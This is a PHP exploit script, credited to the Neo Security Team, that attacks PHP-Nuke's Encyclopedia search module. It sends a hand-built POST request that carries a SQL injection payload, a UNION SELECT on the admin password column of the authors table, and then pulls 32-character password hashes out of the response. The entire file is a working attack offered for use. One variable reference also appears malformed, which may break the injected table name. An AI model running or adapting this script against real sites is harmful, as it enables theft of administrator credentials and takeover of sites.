<?
/*

Neo Security Team - Exploit made by Paisterist on 2006-10-22
http://www.neosecurityteam.net

*/

$host="localhost";
$path="/phpnuke/";
$prefix="nuke_";
$port="80";
$fp = fsockopen($host, $port, $errno, $errstr, 30);
$data="query=fooaa&eid=foo'/**/UNION SELECT pwd as title FROM $prefix_authors WHERE '1'='1";

if ($fp) {
    $p="POST /phpnuke/modules.php?name=Encyclopedia&file=search HTTP/1.0\r\n";
    $p.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword,
application/x-shockwave-flash, */*\r\n";
    $p.="Referer: http://localhost/phpnuke/modules.php?name=Encyclopedia&file=search\r\n";
    $p.="Accept-Language: es-ar\r\n";
    $p.="Content-Type: application/x-www-form-urlencoded\r\n";
    $p.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n";
    $p.="Host: localhost\r\n";
    $p.="Content-Length: ".strlen($data)."\r\n";
    $p.="Pragma: no-cache\r\n";
    $p.="Connection: keep-alive\r\n\r\n";
    $p.=$data;

    fwrite($fp, $p);

    while (!feof($fp)) {
        $content .= fread($fp, 4096);
    }

    preg_match("/([a-zA-Z0-9]{32})/", $content, $matches);

    print_r($matches);
}
?>
